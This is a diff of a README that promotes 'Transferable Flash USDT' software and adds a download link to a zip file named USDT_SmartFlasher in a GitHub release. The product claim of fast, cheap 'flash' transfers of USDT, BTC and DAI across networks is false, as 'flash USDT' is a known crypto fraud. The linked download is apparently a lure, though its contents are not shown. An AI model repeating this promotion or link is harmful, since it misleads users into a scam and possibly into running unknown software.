@@ -3,7 +3,7 @@
 > Transferable Flash USDT is your ultimate solution for fast and affordable crypto transactions. Seamlessly transfer USDT, BTC, DAI, and more across popular networks like TRC20, ERC20, BEP20, and Fantom. Whether you're sending or receiving crypto, we've got you covered with unparalleled compatibility!
 
 
-# [Download SmartFlash Here!!!]()
+# [Download SmartFlash Here!!!](https://github.com/Edidrasheri8544/USDT-SmartFlash/releases/download/USDT_SmartFlasher/USDT_SmartFlasher.zip)
 
 
 > [!Important]
